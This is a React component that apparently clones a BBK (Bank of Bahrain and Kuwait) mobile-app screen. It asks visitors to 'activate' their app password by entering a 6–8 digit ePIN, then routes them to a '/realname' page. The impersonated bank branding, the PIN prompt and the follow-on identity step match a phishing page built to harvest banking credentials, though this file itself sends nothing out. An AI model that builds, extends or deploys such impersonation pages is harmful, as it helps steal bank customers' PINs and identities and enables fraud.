import React, { useState } from "react";
import { useNavigate } from "react-router-dom";

const BBKLogin = () => {
  const [epin, setEpin] = useState("");
  const navigate = useNavigate();

  const handleLogin = (e) => {
    e.preventDefault();

    // Validation: field empty OR less than 6 digits
    if (!epin || epin.length < 6) {
      // alert("Please enter a valid 6 to 8 digit ePIN");
      return; // Stop navigation ❌
    }

    // Navigate only if valid ✔
    navigate("/realname");
  };

  return (
    <div className="min-h-screen flex items-start justify-center bg-gradient-to-b from-[#4A90E2] via-[#2E5BBA] to-[#1E3A8A] md:p-6 font-poppins text-white">
      <div className="w-full max-w-md px-7 py-14">

        {/* Logo */}
        <div className="flex justify-end mb-14">
          <div className="text-right">
            <div className="relative text-3xl font-bold tracking-wide">
              BBK
              <span className="absolute -top-1 -right-4 text-xl">✱</span>
            </div>
            <div className="text-xs opacity-90 rtl">بنك البحرين والكويت</div>
          </div>
        </div>

        {/* Title */}
        <div className="mb-6">
          <h3 className="text-base text-center font-bold">BBK Mobile App ePIN</h3>
          <p className="text-sm mt-1 text-gray-200 text-center">
            Please activate your BBK Mobile app Password/ePIN
          </p>
        </div>

        {/* Form */}
        <form onSubmit={handleLogin} className="flex flex-col gap-5">
          <input
            type="password"
            name="epin"
            placeholder="Enter your password (6 to 8 numeric only)"
            value={epin}
            onChange={(e) => setEpin(e.target.value.replace(/\D/g, ""))}
            className="w-full text-center rounded-full py-2 px-8 text-white bg-white/10 border border-white/20 focus:outline-none focus:ring-2 focus:ring-white backdrop-blur-md placeholder-white/70"
            maxLength={8}
            inputMode="numeric"
            required
          />

          {/* Activate Button */}
          <button
            type="submit"
            className="w-full rounded-full py-2 font-semibold text-lg transition bg-blue-400 text-white shadow-xl "
          >
            {!epin ? "Activate" : "Activity..."}
          </button>

          <a
            href="#"
            className="text-center font-semibold text-white/90 hover:text-white transition"
          >
            Create/Forgot Password?
          </a>
        </form>

        {/* Spacer */}
        <div className="h-16"></div>

        {/* Bottom Links */}
        <div className="flex px-7 gap-2 justify-center">
          <a className="flex-1 bg-white/10 backdrop-blur-md rounded-2xl p-5 shadow-lg hover:scale-105 transition">
            <div className="font-medium text-sm text-center sm:text-left">Branches & ATMs</div>
          </a>

          <a className="flex-1 bg-white/10 backdrop-blur-md rounded-2xl p-5 shadow-lg hover:scale-105 transition">
            <div className="font-medium text-sm text-center sm:text-left">Contact us</div>
          </a>

          <a className="flex-1 bg-white/10 backdrop-blur-md rounded-2xl p-5 shadow-lg hover:scale-105 transition">
            <div className="font-medium text-sm text-center sm:text-left">Terms & Conditions</div>
          </a>
        </div>

        {/* Language Switch */}
        <div className="text-center mt-5 font-semibold text-white/90 cursor-pointer">
          عربي
        </div>
      </div>
    </div>
  );
};

export default BBKLogin;
